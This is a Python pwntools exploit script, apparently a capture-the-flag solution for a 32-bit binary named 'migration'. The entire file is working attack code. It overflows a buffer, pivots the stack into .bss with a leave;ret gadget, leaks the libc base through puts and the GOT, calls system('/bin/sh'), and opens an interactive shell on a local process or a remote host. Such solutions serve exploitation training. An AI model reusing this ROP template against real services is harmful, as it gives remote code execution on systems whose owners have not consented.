#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./migration",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")


def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    bss_addr=0x804a00c
    gadgets = ["a"*40]#padding
    rop2=bss_addr+0x200
    leave_addr=0x08048418#leave ,ret
    gadgets.append(rop2)# second rop addr
    #read second rop to bss
    gadgets.append(code.plt['read'])
    gadgets.append(leave_addr)# do stack migration
    gadgets.append(0)
    gadgets.append(rop2)
    gadgets.append(100)
    payload = flat(gadgets)
    con.sendafter("best :\n",payload)
    
    
    pop_ebx =0x0804836d #pop ebx ; ret
    #leak libc base and call read again
    rop3 = rop2+0x100
    gadgets = [rop3,code.plt['puts'],pop_ebx,code.got['puts'],code.plt['read'],leave_addr,0,rop3,100]
    payload = flat(gadgets)
    con.send(payload)
    libc.address = u32(con.recv(4) )-libc.symbols['puts']
    # exec system
    gadgets=[0,libc.symbols['system'],0,libc.search("/bin/sh").next()]
    payload = flat(gadgets)
    con.send(payload)
exploit()
con.interactive("Shell")    
